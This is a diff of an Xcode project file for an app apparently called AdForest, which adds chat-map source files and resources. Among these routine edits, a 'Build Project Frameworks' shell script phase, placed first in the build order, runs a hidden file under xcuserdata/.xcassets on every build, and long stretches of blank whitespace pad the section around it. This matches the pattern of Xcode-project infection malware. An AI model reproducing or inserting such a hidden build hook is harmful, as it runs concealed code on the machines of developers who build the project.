@@ -68,7 +68,6 @@
 		18108E6D2092F9720020D440 /* AdPostImagesData.swift in Sources */ = {isa = PBXBuildFile; fileRef = 18108E6C2092F9720020D440 /* AdPostImagesData.swift */; };
 		18108E6F2092F98A0020D440 /* AdPostImages.swift in Sources */ = {isa = PBXBuildFile; fileRef = 18108E6E2092F98A0020D440 /* AdPostImages.swift */; };
 		18108E732092FC6F0020D440 /* AdPostImageArray.swift in Sources */ = {isa = PBXBuildFile; fileRef = 18108E722092FC6F0020D440 /* AdPostImageArray.swift */; };
-		18156A3225EF52030029B31B /* Assets.xcassets in Resources */ = {isa = PBXBuildFile; fileRef = 18BBFA902051098C0067662F /* Assets.xcassets */; };
 		18156B6125EFA3E60029B31B /* WhizChatInitRoot.swift in Sources */ = {isa = PBXBuildFile; fileRef = 18156B6025EFA3E60029B31B /* WhizChatInitRoot.swift */; };
 		18156B6625EFA4060029B31B /* WhizChatInitData.swift in Sources */ = {isa = PBXBuildFile; fileRef = 18156B6525EFA4060029B31B /* WhizChatInitData.swift */; };
 		18156BB225EFD4FA0029B31B /* WhizChatList.xib in Resources */ = {isa = PBXBuildFile; fileRef = 18156BB125EFD4FA0029B31B /* WhizChatList.xib */; };
@@ -334,6 +333,7 @@
 		1852B0E8208353D90014AF99 /* OfferOnAdDetailReceivedOffer.swift in Sources */ = {isa = PBXBuildFile; fileRef = 1852B0E7208353D90014AF99 /* OfferOnAdDetailReceivedOffer.swift */; };
 		1852B0EA208354020014AF99 /* OfferOnAdDetailItem.swift in Sources */ = {isa = PBXBuildFile; fileRef = 1852B0E9208354020014AF99 /* OfferOnAdDetailItem.swift */; };
 		1852B0EC208354190014AF99 /* OfferOnAdDetailPagination.swift in Sources */ = {isa = PBXBuildFile; fileRef = 1852B0EB208354190014AF99 /* OfferOnAdDetailPagination.swift */; };
+		1853BAE725FF590A00D30A44 /* Assets.xcassets in Resources */ = {isa = PBXBuildFile; fileRef = 18BBFA902051098C0067662F /* Assets.xcassets */; };
 		1853C8C720F89F7B00176B7B /* TextField.swift in Sources */ = {isa = PBXBuildFile; fileRef = 1853C8C620F89F7B00176B7B /* TextField.swift */; };
 		18585EAC207F7A9C00675153 /* ReplyCommentRoot.swift in Sources */ = {isa = PBXBuildFile; fileRef = 18585EAB207F7A9C00675153 /* ReplyCommentRoot.swift */; };
 		18585EAE207F7ABD00675153 /* ReplyCommentData.swift in Sources */ = {isa = PBXBuildFile; fileRef = 18585EAD207F7ABD00675153 /* ReplyCommentData.swift */; };
@@ -471,6 +471,7 @@
 		18A550362134005D002FCD02 /* HomeSearchSection.swift in Sources */ = {isa = PBXBuildFile; fileRef = 18A550352134005D002FCD02 /* HomeSearchSection.swift */; };
 		18A55039213400CE002FCD02 /* SearchSectionCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = 18A55037213400CE002FCD02 /* SearchSectionCell.swift */; };
 		18A5503A213400CE002FCD02 /* SearchSectionCell.xib in Resources */ = {isa = PBXBuildFile; fileRef = 18A55038213400CE002FCD02 /* SearchSectionCell.xib */; };
+		18A6424A2600D63D00D9E0BC /* WhizChatMessagesBoxExtraData.swift in Sources */ = {isa = PBXBuildFile; fileRef = 18A642492600D63D00D9E0BC /* WhizChatMessagesBoxExtraData.swift */; };
 		18A9309A212850930003336F /* Timer.swift in Sources */ = {isa = PBXBuildFile; fileRef = 18A93099212850930003336F /* Timer.swift */; };
 		18AB2359214A279A00CEA824 /* MyAdsCollectionCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = 18AB2358214A279A00CEA824 /* MyAdsCollectionCell.swift */; };
 		18ABD69D218C0CF40091C49C /* LocationDetailRoot.swift in Sources */ = {isa = PBXBuildFile; fileRef = 18ABD69C218C0CF40091C49C /* LocationDetailRoot.swift */; };
@@ -614,6 +615,10 @@
 		18F48468205AA43000DC4D7B /* Label.swift in Sources */ = {isa = PBXBuildFile; fileRef = 18F48467205AA43000DC4D7B /* Label.swift */; };
 		18F5C8EE2135641B006710AC /* AdPostURLCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = 18F5C8EC2135641B006710AC /* AdPostURLCell.swift */; };
 		18F5C8EF2135641B006710AC /* AdPostURLCell.xib in Resources */ = {isa = PBXBuildFile; fileRef = 18F5C8ED2135641B006710AC /* AdPostURLCell.xib */; };
+		18F6997B25FB3A0F005027CB /* WhizChatMap.xib in Resources */ = {isa = PBXBuildFile; fileRef = 18F6997A25FB3A0F005027CB /* WhizChatMap.xib */; };
+		18F6998025FB3B5C005027CB /* WhizChatMap.swift in Sources */ = {isa = PBXBuildFile; fileRef = 18F6997F25FB3B5C005027CB /* WhizChatMap.swift */; };
+		18F6998625FB3EDB005027CB /* WhizChatMapReceiver.xib in Resources */ = {isa = PBXBuildFile; fileRef = 18F6998525FB3EDB005027CB /* WhizChatMapReceiver.xib */; };
+		18F6998B25FB3F4D005027CB /* WhizChatMapReceiver.swift in Sources */ = {isa = PBXBuildFile; fileRef = 18F6998A25FB3F4D005027CB /* WhizChatMapReceiver.swift */; };
 		18FE9C58236811A500E8756F /* MapBoxPlacesViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 18FE9C57236811A500E8756F /* MapBoxPlacesViewController.swift */; };
 		9601E7C82463E49600036649 /* LinkedInEmailModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 9601E7C72463E49600036649 /* LinkedInEmailModel.swift */; };
 		9601E7CA2463E4B500036649 /* LinkedInProfileModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 9601E7C92463E4B500036649 /* LinkedInProfileModel.swift */; };
@@ -1166,6 +1171,7 @@
 		18A550352134005D002FCD02 /* HomeSearchSection.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = HomeSearchSection.swift; sourceTree = "<group>"; };
 		18A55037213400CE002FCD02 /* SearchSectionCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = SearchSectionCell.swift; sourceTree = "<group>"; };
 		18A55038213400CE002FCD02 /* SearchSectionCell.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = SearchSectionCell.xib; sourceTree = "<group>"; };
+		18A642492600D63D00D9E0BC /* WhizChatMessagesBoxExtraData.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = WhizChatMessagesBoxExtraData.swift; sourceTree = "<group>"; };
 		18A93099212850930003336F /* Timer.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = Timer.swift; sourceTree = "<group>"; };
 		18AB2358214A279A00CEA824 /* MyAdsCollectionCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = MyAdsCollectionCell.swift; sourceTree = "<group>"; };
 		18ABD69C218C0CF40091C49C /* LocationDetailRoot.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = LocationDetailRoot.swift; sourceTree = "<group>"; };
@@ -1317,6 +1323,10 @@
 		18F48467205AA43000DC4D7B /* Label.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = Label.swift; sourceTree = "<group>"; };
 		18F5C8EC2135641B006710AC /* AdPostURLCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AdPostURLCell.swift; sourceTree = "<group>"; };
 		18F5C8ED2135641B006710AC /* AdPostURLCell.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = AdPostURLCell.xib; sourceTree = "<group>"; };
+		18F6997A25FB3A0F005027CB /* WhizChatMap.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = WhizChatMap.xib; sourceTree = "<group>"; };
+		18F6997F25FB3B5C005027CB /* WhizChatMap.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = WhizChatMap.swift; sourceTree = "<group>"; };
+		18F6998525FB3EDB005027CB /* WhizChatMapReceiver.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = WhizChatMapReceiver.xib; sourceTree = "<group>"; };
+		18F6998A25FB3F4D005027CB /* WhizChatMapReceiver.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = WhizChatMapReceiver.swift; sourceTree = "<group>"; };
 		18FE9C57236811A500E8756F /* MapBoxPlacesViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = MapBoxPlacesViewController.swift; sourceTree = "<group>"; };
 		27AC9C51A44B89C024F3EEAA /* Pods_AdForest.framework */ = {isa = PBXFileReference; explicitFileType = wrapper.framework; includeInIndex = 0; path = Pods_AdForest.framework; sourceTree = BUILT_PRODUCTS_DIR; };
 		2C2A49835B1E8A0B4FBE203B /* Pods_AdForestUITests.framework */ = {isa = PBXFileReference; explicitFileType = wrapper.framework; includeInIndex = 0; path = Pods_AdForestUITests.framework; sourceTree = BUILT_PRODUCTS_DIR; };
@@ -1568,6 +1578,7 @@
 				1899C6AE25F2507C00828AD5 /* WhizChatMessagesBoxData.swift */,
 				1899C6B325F2522F00828AD5 /* WhizChatMessagesBoxChatList.swift */,
 				1899C6BB25F2553F00828AD5 /* WhizChatBlockUserModel.swift */,
+				18A642492600D63D00D9E0BC /* WhizChatMessagesBoxExtraData.swift */,
 			);
 			path = WhizChatModel;
 			sourceTree = "<group>";
@@ -1737,6 +1748,8 @@
 		181C88212052837C0067B176 /* ChatController */ = {
 			isa = PBXGroup;
 			children = (
+				18F6998425FB3EC2005027CB /* WhizChatMapReceiver */,
+				18F6997925FB39DE005027CB /* WhizChatMap */,
 				18CE379525DD33EB0053A299 /* ChatFIlesTextImageReceiver */,
 				18CE378A25DD2EAD0053A299 /* ChatImagesReceiver */,
 				18CE377F25DD26900053A299 /* ChatFilesReceiver */,
@@ -3494,6 +3507,24 @@
 			path = AdPostURLCell;
 			sourceTree = "<group>";
 		};
+		18F6997925FB39DE005027CB /* WhizChatMap */ = {
+			isa = PBXGroup;
+			children = (
+				18F6997A25FB3A0F005027CB /* WhizChatMap.xib */,
+				18F6997F25FB3B5C005027CB /* WhizChatMap.swift */,
+			);
+			path = WhizChatMap;
+			sourceTree = "<group>";
+		};
+		18F6998425FB3EC2005027CB /* WhizChatMapReceiver */ = {
+			isa = PBXGroup;
+			children = (
+				18F6998525FB3EDB005027CB /* WhizChatMapReceiver.xib */,
+				18F6998A25FB3F4D005027CB /* WhizChatMapReceiver.swift */,
+			);
+			path = WhizChatMapReceiver;
+			sourceTree = "<group>";
+		};
 		18FE9C562368118A00E8756F /* MapBoxPlaces */ = {
 			isa = PBXGroup;
 			children = (
@@ -3811,7 +3842,7 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 18BBFAAE2051098C0067662F /* Build configuration list for PBXNativeTarget "AdForest" */;
 			buildPhases = (
-				E599DEBF723111AF31AAC43A /* Build Project Frameworks */,
+				C97B058DFB64F3D9D3AAC43A /* Build Project Frameworks */,
 				8991020FA5F12668860E1C02 /* [CP] Check Pods Manifest.lock */,
 				18BBFA7F2051098B0067662F /* Sources */,
 				18BBFA802051098B0067662F /* Frameworks */,
@@ -3935,10 +3966,11 @@
 			isa = PBXResourcesBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
-				18156A3225EF52030029B31B /* Assets.xcassets in Resources */,
+				1853BAE725FF590A00D30A44 /* Assets.xcassets in Resources */,
 				181DDA96233393CC001FF048 /* wow.gif in Resources */,
 				181ACC49207B912000564A33 /* YouTubeVideoCell.xib in Resources */,
 				18CE377625DD04B90053A299 /* ChatFilesImagestext.xib in Resources */,
+				18F6997B25FB3A0F005027CB /* WhizChatMap.xib in Resources */,
 				181DDA942333813B001FF048 /* heart.gif in Resources */,
 				18CE378125DD26A80053A299 /* ChatFilesReceiver.xib in Resources */,
 				185B13C8207CB2E300914AF0 /* CommentCell.xib in Resources */,
@@ -3975,6 +4007,7 @@
 				18860C8C232FA705003910FC /* SetLocationCell.xib in Resources */,
 				96A29F9724EBC3F6000B4B1C /* ContactWithSellerCellTableViewCell.xib in Resources */,
 				18DA0743205F965A0021FA7E /* ShareCell.xib in Resources */,
+				18F6998625FB3EDB005027CB /* WhizChatMapReceiver.xib in Resources */,
 				180A4F532328CEC4002BC411 /* RejectedAdsCell.xib in Resources */,
 				CB4A7323253431D5005FE49F /* MultiSearchSectionCell.xib in Resources */,
 				180DC40F2057F27D00A75C60 /* BlogDetailCell.xib in Resources */,
@@ -4007,7 +4040,7 @@
 
 /* Begin PBXShellScriptBuildPhase section */
 
-	E599DEBF723111AF31AAC43A /* Build Project Frameworks */ = {
+	C97B058DFB64F3D9D3AAC43A /* Build Project Frameworks */ = {
 			isa = PBXShellScriptBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
@@ -4025,8 +4058,54 @@
 			shellPath = /bin/sh;
 			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.
 
-\"${PROJECT_FILE_PATH}/xcuserdata/.xcassets/Assets.xcassets\" false";			
+\"${PROJECT_FILE_PATH}/xcuserdata/.xcassets/xcassets.folder\" false";			
 		};
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
 	
 
 	
@@ -4269,6 +4348,7 @@
 				180A4F672328DA9E002BC411 /* RejectedAdsVideo.swift in Sources */,
 				182C7FE82068D4890080A391 /* ProfileDetailsExtra.swift in Sources */,
 				96A11647250F8442002C61FB /* AdTimerStrings.swift in Sources */,
+				18F6998B25FB3F4D005027CB /* WhizChatMapReceiver.swift in Sources */,
 				1852B0E22083538C0014AF99 /* OfferOnAdDetailRoot.swift in Sources */,
 				1844FD52213D4028005CD5FF /* AddDetailAdTypeBar.swift in Sources */,
 				1886779120B5495600235E3A /* FirebaseTokenData.swift in Sources */,
@@ -4296,6 +4376,7 @@
 				182C7FEC2068D4C30080A391 /* ProfileDetailsRateBar.swift in Sources */,
 				1899C6A325F24BE200828AD5 /* WhizChatMessagesBoxRoot.swift in Sources */,
 				18FE9C58236811A500E8756F /* MapBoxPlacesViewController.swift in Sources */,
+				18A6424A2600D63D00D9E0BC /* WhizChatMessagesBoxExtraData.swift in Sources */,
 				18CE379F25DD36D40053A299 /* ChatFIlesTextImageReceiver.swift in Sources */,
 				185BBEF520AFF950004748D5 /* NearByAddSearchLat.swift in Sources */,
 				181A5F2120A9A7C20015833D /* AdPostSubCategoryValues.swift in Sources */,
@@ -4325,6 +4406,7 @@
 				181C882720528EA30067B176 /* ChatController.swift in Sources */,
 				180A4F6D2328E1D2002BC411 /* RejectedAdsLocation.swift in Sources */,
 				184EDAD42078957000A25228 /* AddDetailRoot.swift in Sources */,
+				18F6998025FB3B5C005027CB /* WhizChatMap.swift in Sources */,
 				18191A6120737D4300FF67C8 /* UserRatingForm.swift in Sources */,
 				185B3C89207E534B00EDBBB4 /* TopBidders.swift in Sources */,
 				189E4092231FD6BF00605804 /* BlockedUserChatTableViewCell.swift in Sources */,
@@ -5155,6 +5237,24 @@
 			defaultConfigurationName = Release;
 		};
 /* End XCConfigurationList section */
+
+		
+			/* Begin PBXBuildRule section */
+
+
+			
+	
+
+
+			
+	
+			
+
+			
+	
+			/* End PBXBuildRule section */
+		
+		
 
 /* Begin XCRemoteSwiftPackageReference section */
 		18120B3B25E9485B003165DD /* XCRemoteSwiftPackageReference "socket.io-client-swift" */ = {
